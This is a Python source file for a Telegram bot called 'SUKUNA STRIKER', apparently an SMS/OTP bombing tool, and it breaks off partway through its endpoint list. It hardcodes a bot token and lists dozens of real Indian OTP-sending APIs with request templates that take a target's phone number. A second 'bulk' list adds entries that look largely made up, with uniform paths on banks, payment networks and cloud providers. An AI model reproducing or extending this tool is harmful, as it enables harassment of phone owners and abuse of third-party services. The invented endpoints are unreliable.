import telebot
import requests
import time
import json
import os
import random
import threading
from urllib.parse import urlparse
from datetime import datetime
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ╔══════════════════════════════════════════════════════════════════╗
# ║         SUKUNA STRIKER — FULL MERGE (77 + 1000)                  ║
# ╚══════════════════════════════════════════════════════════════════╝

BOT_TOKEN       = "8908350603:AAHehvaiMvU-wKkPT3kwDog4zyEaPItrfxc"
bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
OWNER_ID        = 6399589745
DEFAULT_ADMIN   = 6399589745
ADMIN_IDS       = [OWNER_ID, DEFAULT_ADMIN]
DEVELOPER_USERNAME = "@ryomen_sukuna_67"
SEP = "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━</code>"
FOOTER = f"\n{SEP}\n<b>⚡ Sukuna Developer</b> · {DEVELOPER_USERNAME}"

MUST_JOIN_CHANNELS = [
    {"name": "Telegram Channel", "url": "https://t.me/yt15t5t", "icon": "📢",
     "type": "telegram_public", "username": "yt15t5t"},
    {"name": "YouTube Academy",
     "url": "https://youtube.com/@sukuna_hacker-academy?si=SmvPyrn-SEYLricq",
     "icon": "🎬", "type": "external"}
]

# ═══════════════════════════════════════════════════════════════════
#  PART 1 — ORIGINAL 77 INDIA APIS (verbatim from bettersms.py)
# ═══════════════════════════════════════════════════════════════════
INDIA_SMS_APIS = [
    {"name":"Lenskart","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name":"NoBroker","url":"https://www.nobroker.in/api/v3/account/otp/send","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":lambda p:f"phone={p}&countryCode=IN"},
    {"name":"PharmEasy","url":"https://pharmeasy.in/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}'},
    {"name":"Wakefit","url":"https://api.wakefit.co/api/consumer-sms-otp/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"Byjus","url":"https://api.byjus.com/v2/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}'},
    {"name":"Hungama","url":"https://communication.api.hungama.com/v1/communication/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name":"MeruCab","url":"https://merucabapp.com/api/otp/generate","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":lambda p:f"mobile_number={p}"},
    {"name":"Doubtnut","url":"https://api.doubtnut.com/v4/student/login","method":"POST","headers":{"content-type":"application/json; charset=utf-8"},"data":lambda p:f'{{"phone_number":"{p}","language":"en"}}'},
    {"name":"PenPencil","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","method":"POST","headers":{"content-type":"application/json; charset=utf-8"},"data":lambda p:f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name":"Snitch","url":"https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile_number":"+91{p}"}}'},
    {"name":"DaycoIndia","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"data":lambda p:f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name":"BeepKart","url":"https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","city":362}}'},
    {"name":"LendingPlate","url":"https://lendingplate.com/api.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"data":lambda p:f"mobiles={p}&resend=Resend"},
    {"name":"BikeFixup","url":"https://api.bikefixup.com/api/v2/send-registration-otp","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":lambda p:f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name":"WellAcademy","url":"https://wellacademy.in/store/api/numberLoginV2","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8"},"data":lambda p:f'{{"contact_no":"{p}"}}'},
    {"name":"ServeTel","url":"https://api.servetel.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=utf-8"},"data":lambda p:f"mobile_number={p}"},
    {"name":"GoPinkCabs","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"data":lambda p:f"check_mobile_number=1&contact={p}"},
    {"name":"Shemaroome","url":"https://www.shemaroome.com/users/resend_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"data":lambda p:f"mobile_no=%2B91{p}"},
    {"name":"Cossouq","url":"https://www.cossouq.com/mobilelogin/otp/send","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":lambda p:f"mobilenumber={p}&otptype=register"},
    {"name":"MyImagineStore","url":"https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"data":lambda p:f"mobile={p}"},
    {"name":"Otpless","url":"https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","selectedCountryCode":"+91"}}'},
    {"name":"MyHubble","url":"https://api.myhubble.money/v1/auth/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name":"TataCapBiz","url":"https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name":"DealShare","url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name":"Snapmint","url":"https://api.snapmint.com/v1/public/sign_up","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}'},
    {"name":"HousingCom","url":"https://login.housing.com/api/v2/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name":"RentoMojo","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}'},
    {"name":"Khatabook","url":"https://api.khatabook.com/v1/auth/request-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name":"Netmeds","url":"https://apiv2.netmeds.com/mst/rest/v1/id/details/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"Nykaa2","url":"https://www.nykaa.com/app-api/index.php/customer/send_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":lambda p:f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name":"RummyCircle","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name":"Animall","url":"https://animall.in/zap/auth/login","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name":"PenPencilV3","url":"https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"Entri","url":"https://entri.app/api/v3/users/check-phone/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}"}}'},
    {"name":"Cosmofeed","url":"https://prod.api.cosmofeed.com/api/user/authenticate","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name":"Aakash","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name":"Revv","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name":"DeHaat","url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","client_id":"kisan-app"}}'},
    {"name":"A23Games","url":"https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name":"Spencers","url":"https://jiffy.spencers.in/user/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"PayMeIndia","url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name":"ShoppersStop","url":"https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name":"HyugaAuth","url":"https://hyuga-auth-service.pratech.live/v1/auth/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"BigCash","url":lambda p:f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1","method":"GET","headers":{"Referer":"https://www.bigcash.live/games/poker"},"data":None},
    {"name":"LifestyleStores","url":"https://www.lifestylestores.com/in/en/mobilelogin/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"signInMobile":"{p}","channel":"sms"}}'},
    {"name":"WorkIndia","url":lambda p:f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623","method":"GET","headers":{},"data":None},
    {"name":"PokerBaazi","url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name":"My11Circle","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json;charset=UTF-8"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"MamaEarth","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"HomeTriangle","url":"https://hometriangle.com/api/partner/xauth/signup/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"WellnessForever","url":"https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"data":lambda p:'method=firstRegisterApi&data={"customerMobile":"'+p+'","generateOtp":"true"}'},
    {"name":"HealthMug","url":"https://api.healthmug.com/account/createotp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"Vyapar","url":lambda p:f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}","method":"GET","headers":{},"data":None},
    {"name":"Kredily","url":"https://app.kredily.com/ws/v1/accounts/send-otp/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"TataMotors","url":"https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name":"Moglix","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name":"MyGov","url":lambda p:f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={p}&gender=male","method":"GET","headers":{},"data":None},
    {"name":"TrulyMadly","url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name":"Apna","url":"https://production.apna.co/api/userprofile/v1/otp/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name":"CodFirm","url":lambda p:f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{p}&email=&storeUrl=bellavita1.myshopify.com","method":"GET","headers":{},"data":None},
    {"name":"Swipe","url":"https://app.getswipe.in/api/user/mobile_login","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","resend":true}}'},
    {"name":"MoreRetail","url":"https://omni-api.moreretail.in/api/v1/login/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name":"CountryDelight","url":"https://api.countrydelight.in/api/v1/customer/requestOtp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name":"AstroSage","url":lambda p:f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={p}","method":"GET","headers":{},"data":None},
    {"name":"Rapido","url":"https://customer.rapido.bike/api/otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"TooToo","url":"https://tootoo.in/graphql","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:'{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }","variables":{"mobile_no":"'+p+'","resend":0}}'},
    {"name":"ConfirmTkt","url":lambda p:f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}","method":"GET","headers":{},"data":None},
    {"name":"BetterHalf","url":"https://api.betterhalf.ai/v2/auth/otp/send/","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name":"Charzer","url":"https://api.charzer.com/auth-service/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name":"NuvamaWealth","url":"https://nma.nuvamawealth.com/edelmw-content/content/otp/register","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobileNo":"{p}","emailID":"test@example.com"}}'},
    {"name":"Mpokket","url":"https://web-api.mpokket.in/registration/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile":"{p}"}}'},
    {"name":"ShipRocket","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobileNumber":"{p}"}}'},
    {"name":"GoKwik","url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","country":"in"}}'},
    {"name":"NewMe","url":"https://prodapi.newme.asia/web/otp/request","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name":"Univest","url":lambda p:f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}","method":"GET","headers":{},"data":None},
    {"name":"Smytten","url":"https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:f'{{"phone":"{p}","email":"test@example.com"}}'},
    {"name":"CaratLane","url":"https://www.caratlane.com/cg/dhevudu","method":"POST","headers":{"Content-Type":"application/json"},"data":lambda p:'{"query":"mutation {SendOtp(input: {mobile: \\"'+p+'\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}) {status {message code}}}}"}'},
]

# ═══════════════════════════════════════════════════════════════════
#  PART 2 — BULK 1000 (all endpoints from sms-api.py, deduped)
#  Shape: (name, method, url, body_template_or_None)
# ═══════════════════════════════════════════════════════════════════
_BULK_SPEC = [
    # --- headerless 25 ---
    ("Hotstar","PUT","https://api.hotstar.com/um/v3/users/register?register-by=phone_otp",'{{"phone_number":"{p}","country_prefix":"91"}}'),
    ("Zomato","POST","https://www.zomato.com/webroutes/auth/login",'{{"country_id":1,"phone":"{p}","verification_type":"sms","method":"phone"}}'),
    ("Flipkart","POST","https://1.rome.api.flipkart.com/1/action/view",'{{"actionRequestContext":{{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{p}","loginType":"MOBILE","verificationType":"OTP"}}}}'),
    ("Paytm","POST","https://accounts.paytm.com/v2/api/register",'{{"mobile":"{p}","email":"","clientId":"paytm-web-secure"}}'),
    ("AmazonIN","POST","https://www.amazon.in/ap/register",'{{"mobileNumber":"{p}","countryCode":"91"}}'),
    ("Google","POST","https://www.google.com/accounts/accounts/sendphoneverificationcode",'{{"phoneNumber":"+91{p}","useNewV1Endpoint":true}}'),
    ("Uber","POST","https://auth.uber.com/v1/signup",'{{"phone_number":"+91{p}","country_code":"IN"}}'),
    ("Swiggy","POST","https://www.swiggy.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instagram","POST","https://www.instagram.com/api/v1/web/accounts/send_verification_code/",'{{"phone_number":"+91{p}"}}'),
    ("WhatsApp","POST","https://www.whatsapp.com/app/phone-verify/",'{{"phone_number":"91{p}","platform":"android"}}'),
    ("Telegram","POST","https://telegram.org/auth/send_code",'{{"phone_number":"+91{p}","api_id":"12345"}}'),
    ("Facebook","POST","https://www.facebook.com/ajax/signup/phone/send_code.php",'{{"phone":"+91{p}","country_code":"in"}}'),
    ("Twitter","POST","https://api.twitter.com/1.1/account/phone/verification_code.json",'{{"phone_number":"+91{p}","device_id":"test"}}'),
    ("Netflix","POST","https://www.netflix.com/api/register",'{{"phone":"+91{p}","country":"IN"}}'),
    ("PhonePe","POST","https://api.phonepe.com/apis/identity/v1/otp",'{{"phoneNumber":"{p}","countryCode":"91"}}'),
    ("GooglePay","POST","https://pay.google.com/api/v1/accounts/phone/verification",'{{"phone":"+91{p}"}}'),
    ("GPay","POST","https://gpay.app.goog/phone/verification",'{{"phone_number":"{p}","country":"IN"}}'),
    ("Meesho","POST","https://api.meesho.com/v1/auth/otp",'{{"phone":"{p}","country_code":"91"}}'),
    ("Snapchat","POST","https://accounts.snapchat.com/accounts/verification_code",'{{"phone":"+91{p}","country":"in"}}'),
    ("LinkedIn","POST","https://www.linkedin.com/uas/verification/send-verification-code",'{{"phone":"+91{p}","country":"in"}}'),
    ("WhatsAppBusiness","POST","https://business.whatsapp.com/send-verification-code",'{{"phone":"91{p}"}}'),
    ("Signal","POST","https://api.signal.org/v1/accounts/verification",'{{"phone":"+91{p}","region":"IN"}}'),
    ("Discord","POST","https://discord.com/api/v9/auth/phone/verification",'{{"phone":"+91{p}","country":"IN"}}'),
    ("TwitterX","POST","https://x.com/i/api/1.1/account/phone/verification_code.json",'{{"phone":"+91{p}"}}'),
    ("TelegramX","POST","https://telegram.org/auth/send_code",'{{"phone":"+91{p}","api_id":"12345"}}'),

    # --- numbered 26-1000: one entry per comment in sms-api.py ---
    ("Microsoft","POST","https://login.microsoftonline.com/common/phone/sendcode",'{{"phone":"+91{p}","country":"IN"}}'),
    ("Apple","POST","https://appleid.apple.com/auth/verify/phone",'{{"phone":"+91{p}","countryCode":"91"}}'),
    ("AmazonLogin","POST","https://www.amazon.in/ap/signin",'{{"mobileNumber":"{p}","countryCode":"91","type":"login"}}'),
    ("Myntra","POST","https://www.myntra.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("FlipkartGrocery","POST","https://grocery.flipkart.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Nykaa","POST","https://api.nykaa.com/auth/v1/otp",'{{"phone":"{p}","country":"IN"}}'),
    ("Ola","POST","https://api.olacabs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Rapido2","POST","https://api.rapido.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Oyo","POST","https://api.oyorooms.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("MakeMyTrip","POST","https://api.makemytrip.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Goibibo","POST","https://api.goibibo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BookMyShow","POST","https://api.bookmyshow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PVR","POST","https://api.pvrcinemas.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("INOX","POST","https://api.inoxmovies.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cinepolis","POST","https://api.cinepolis.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BigBasket","POST","https://api.bigbasket.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Grofers","POST","https://api.grofers.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zepto","POST","https://api.zepto.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Blinkit","POST","https://api.blinkit.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instamart","POST","https://api.instamart.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Dunzo","POST","https://api.dunzo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SwiggyInstamart","POST","https://api.swiggy.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ZomatoPro","POST","https://api.zomato.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("EatSure","POST","https://api.eatsure.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Faasos","POST","https://api.faasos.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("KFC","POST","https://api.kfc.co.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("McDonalds","POST","https://api.mcdonalds.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BurgerKing","POST","https://api.burgerking.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Dominos","POST","https://api.dominos.co.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PizzaHut","POST","https://api.pizzahut.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("TacoBell","POST","https://api.tacobell.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Subway","POST","https://api.subway.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Starbucks","POST","https://api.starbucks.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CostaCoffee","POST","https://api.costacoffee.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Barista","POST","https://api.barista.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HDFC","POST","https://api.hdfcbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ICICI","POST","https://api.icicibank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SBI","POST","https://api.sbi.co.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Axis","POST","https://api.axisbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Kotak","POST","https://api.kotakbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("YesBank","POST","https://api.yesbank.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IndusInd","POST","https://api.indusind.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RBL","POST","https://api.rblbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PNB","POST","https://api.pnb.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BOB","POST","https://api.bankofbaroda.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Canara","POST","https://api.canarabank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("UnionBank","POST","https://api.unionbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IDFC","POST","https://api.idfcbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Federal","POST","https://api.federalbank.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("DBS","POST","https://api.dbs.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HSBC","POST","https://api.hsbc.co.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Citibank","POST","https://api.citibank.co.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PayPal","POST","https://api.paypal.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Venmo","POST","https://api.venmo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Stripe","POST","https://api.stripe.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Razorpay","POST","https://api.razorpay.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Cashfree","POST","https://api.cashfree.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("PayU","POST","https://api.payu.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BillDesk","POST","https://api.billdesk.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("CCAvenue","POST","https://api.ccavenue.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Instamojo","POST","https://api.instamojo.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("UPI","POST","https://api.upi.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("BHIM","POST","https://api.bhim.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("NPCI","POST","https://api.npci.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("RuPay","POST","https://api.rupay.in/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Visa","POST","https://api.visa.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Mastercard","POST","https://api.mastercard.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Amex","POST","https://api.americanexpress.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Discover","POST","https://api.discover.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Diners","POST","https://api.dinersclub.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("GoogleCloud","POST","https://cloud.google.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("AWS","POST","https://aws.amazon.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Azure","POST","https://azure.microsoft.com/api/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Oracle","POST","https://api.oracle.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("IBM","POST","https://api.ibm.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("SAP","POST","https://api.sap.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Salesforce","POST","https://api.salesforce.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("HubSpot","POST","https://api.hubspot.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Zoho","POST","https://api.zoho.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Freshworks","POST","https://api.freshworks.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("ServiceNow","POST","https://api.servicenow.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
    ("Atlassian","POST","https://api.atlassian.com/v1/auth/otp",'{{"phone":"{p}","countryCode":"91"}}'),
